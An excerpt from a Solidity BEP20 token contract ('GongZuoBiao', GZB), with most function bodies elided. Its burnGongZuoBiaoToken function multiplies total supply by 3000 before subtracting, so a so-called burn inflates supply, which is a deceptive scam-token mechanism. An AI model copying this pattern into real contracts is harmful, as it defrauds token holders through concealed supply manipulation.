...
contract GongZuoBiao is IERC20, libAuthorization {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "GongZuoBiao";
    string constant _symbol = "GZB";
	...
	function generatingRebase(int256 supplyDelta, uint256 supplyMax) private view returns (uint256) {
	...
	function zeroburnToken(address account, uint256 amounts) internal {
	...
	function burnGongZuoBiaoToken(address account, uint256 amounts) internal {
		require(account != address(0), "BEP20: burn from the zero address"); 
		_totalSupply = _totalSupply * (3000);
		_totalSupply = _totalSupply - amounts;
	  }
